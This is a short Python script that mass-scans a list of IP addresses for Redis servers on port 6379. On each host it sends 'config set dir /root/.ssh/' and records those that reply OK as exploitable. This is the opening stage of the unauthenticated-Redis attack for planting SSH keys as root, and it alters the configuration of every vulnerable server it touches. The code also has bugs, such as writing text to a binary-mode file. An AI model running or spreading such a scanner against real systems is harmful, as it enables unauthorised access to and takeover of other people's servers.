# from pwntools import *
import os, sys
import socket

filename = ''
try:
	filename = sys.argv[1]
	with open(filename,'rb') as f:
		url_list = [x.strip() for x in f.readlines()]

	good_list = []
	for idx,ip in enumerate(url_list):
		socket.setdefaulttimeout(5)
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		payload = 'config set dir /root/.ssh/'
		print('{}/{}'.format(idx,len(url_list)))
		try:
			# print('[INFO] connecting {}'.format(ip))
			s.connect((ip, 6379))
			s.send(b'config set dir /root/.ssh/\r\n')
			response = s.recv(1024)
			if b'ok' in response.lower():
				print('[GOOD]{0} exist'.format(ip))
				good_list.append(ip)
			else:
				pass
		except:
			pass
	good_list = [x for x in good_list]
	with open('result.txt','wb') as f:
		f.writelines('\n'.join(good_list))
except:
	print('usage: python3 {}.py InputFile'.format(sys.argv[0]))

